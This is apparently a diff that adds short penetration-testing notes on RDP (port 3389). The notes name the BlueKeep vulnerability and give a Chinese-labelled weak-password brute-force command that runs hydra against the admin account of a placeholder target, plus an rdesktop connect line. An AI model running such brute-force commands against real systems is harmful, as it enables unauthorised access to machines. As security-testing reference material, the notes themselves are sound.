@@ -1,1 +1,4 @@
-
+RDP (3389)
+BlueKeep(CVE-2019-0708)
+弱密码爆破: hydra -l admin -P pass.txt rdp://target
+rdesktop target:3389
